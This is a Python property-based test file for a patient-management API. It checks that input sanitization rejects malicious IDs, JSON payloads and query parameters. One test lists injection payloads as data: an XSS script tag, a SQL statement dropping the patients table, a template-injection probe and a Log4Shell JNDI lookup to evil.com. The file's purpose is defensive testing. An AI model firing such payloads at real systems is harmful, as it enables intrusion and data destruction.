"""
Property-based tests for input sanitization security.
Tests Property 14: Input Sanitization Security
**Validates: Requirements 6.4**
"""

import pytest
from hypothesis import given, strategies as st, assume
from fastapi.testclient import TestClient

from src.api.main import app
from src.utils.validation import (
    sanitize_string, 
    validate_patient_id, 
    is_suspicious_input,
    DANGEROUS_PATTERNS
)


class TestInputSanitizationSecurity:
    """Test input sanitization security measures."""
    
    @given(st.text())
    def test_sanitize_string_preserves_safe_content(self, text):
        """
        Property 14: Input Sanitization Security
        For any safe input text, sanitization should preserve the content.
        **Validates: Requirements 6.4**
        """
        # Skip if text contains dangerous patterns
        assume(not is_suspicious_input(text))
        assume(len(text.strip()) > 0)  # Skip empty strings
        
        # Skip if text contains control characters (these should be removed)
        assume(not any(ord(c) < 32 or ord(c) == 127 for c in text))
        
        try:
            sanitized = sanitize_string(text)
            # Safe content without control characters should be mostly preserved
            assert len(sanitized) >= len(text.strip()) * 0.8, f"Too much content removed from safe text: '{text}' -> '{sanitized}'"
        except ValueError:
            # If sanitization raises ValueError, the text was deemed malicious
            # This is acceptable for edge cases
            pass
    
    @given(st.text(min_size=1, max_size=50))
    def test_patient_id_validation_security(self, patient_id):
        """
        Property 14: Input Sanitization Security  
        For any patient ID input, validation should either accept safe IDs or reject dangerous ones.
        **Validates: Requirements 6.4**
        """
        try:
            validated_id = validate_patient_id(patient_id)
            # If validation succeeds, the ID should be safe
            assert not is_suspicious_input(validated_id), f"Validated patient ID contains suspicious content: '{validated_id}'"
            assert len(validated_id) <= 50, f"Validated patient ID too long: {len(validated_id)}"
            assert len(validated_id.strip()) > 0, f"Validated patient ID is empty"
        except ValueError:
            # Rejection is acceptable for invalid/dangerous IDs
            pass
    
    @given(st.text())
    def test_malicious_input_detection(self, text):
        """
        Property 14: Input Sanitization Security
        For any input containing dangerous patterns, the system should detect it as suspicious.
        **Validates: Requirements 6.4**
        """
        # Check if text contains any dangerous patterns
        contains_dangerous = any(
            __import__('re').search(pattern, text, __import__('re').IGNORECASE) 
            for pattern in DANGEROUS_PATTERNS
        )
        
        if contains_dangerous:
            # If text contains dangerous patterns, it should be detected as suspicious
            assert is_suspicious_input(text), f"Failed to detect suspicious input: '{text}'"
    
    def test_api_path_injection_protection(self):
        """
        Property 14: Input Sanitization Security
        API should block path injection attempts.
        **Validates: Requirements 6.4**
        """
        client = TestClient(app)
        
        malicious_paths = [
            "/patients/P<script>alert('xss')</script>",
            "/patients/P'; DROP TABLE patients; --",
            "/patients/P{{7*7}}",
            "/patients/P${jndi:ldap://evil.com/a}",
        ]
        
        for path in malicious_paths:
            try:
                response = client.get(path)
                # Should either block (400) or not find (404), but not succeed (200)
                assert response.status_code in [400, 404], f"Malicious path not blocked: {path} -> {response.status_code}"
                
                if response.status_code == 400:
                    error_data = response.json()
                    # Error message should not expose the malicious content
                    message = error_data.get("message", "").lower()
                    assert "script" not in message, f"Error message exposes XSS content: {message}"
                    assert "drop" not in message, f"Error message exposes SQL injection: {message}"
            except Exception:
                # Network/parsing errors are acceptable for malicious requests
                pass
    
    @given(st.dictionaries(
        st.text(min_size=1, max_size=20), 
        st.one_of(st.text(), st.integers(), st.floats(allow_nan=False))
    ))
    def test_json_payload_sanitization(self, payload_dict):
        """
        Property 14: Input Sanitization Security
        JSON payloads with malicious content should be rejected or sanitized.
        **Validates: Requirements 6.4**
        """
        client = TestClient(app)
        
        # Skip if payload is too large or contains non-serializable data
        try:
            import json
            json.dumps(payload_dict)
        except (TypeError, ValueError):
            assume(False)
        
        # Add required fields for patient registration
        test_payload = {
            "patient_id": "TEST123",
            "arrival_mode": "Ambulance",
            "acuity_level": 3,
            "initial_vitals": {
                "heart_rate": 72.0,
                "systolic_bp": 120.0,
                "diastolic_bp": 80.0,
                "respiratory_rate": 16.0,
                "oxygen_saturation": 98.0,
                "temperature": 36.5,
                "timestamp": "2024-01-15T10:30:00Z"
            }
        }
        
        # Merge with generated payload (may contain malicious data)
        test_payload.update(payload_dict)
        
        try:
            response = client.post("/patients", json=test_payload)
            
            # If request succeeds, check that no malicious content was processed
            if response.status_code == 201:
                response_data = response.json()
                patient_id = response_data.get("patient_id", "")
                assert not is_suspicious_input(patient_id), f"Malicious content in response: {patient_id}"
            
            # Validation errors (422) and bad requests (400) are acceptable
            assert response.status_code in [201, 400, 422, 409], f"Unexpected status for payload: {response.status_code}"
            
        except Exception:
            # Network/parsing errors are acceptable for malicious payloads
            pass
    
    @given(st.text(min_size=1, max_size=100))
    def test_query_parameter_sanitization(self, param_value):
        """
        Property 14: Input Sanitization Security
        Query parameters with malicious content should be detected and handled safely.
        **Validates: Requirements 6.4**
        """
        client = TestClient(app)
        
        try:
            # Test with potentially malicious query parameter
            response = client.get(f"/patients/P12345/history?limit={param_value}")
            
            # Should not return 200 if parameter contains dangerous content
            if is_suspicious_input(param_value):
                assert response.status_code != 200, f"Malicious query param not blocked: {param_value}"
            
            # Check that error responses don't expose malicious content
            if response.status_code >= 400:
                try:
                    error_data = response.json()
                    message = error_data.get("message", "").lower()
                    # Error message should not contain dangerous patterns
                    for pattern in ["<script", "drop table", "{{", "${", "javascript:"]:
                        assert pattern not in message, f"Error message exposes dangerous content: {message}"
                except:
                    # Non-JSON responses are acceptable
                    pass
                    
        except Exception:
            # Network/parsing errors are acceptable for malicious parameters
            pass


if __name__ == "__main__":
    pytest.main([__file__, "-v"])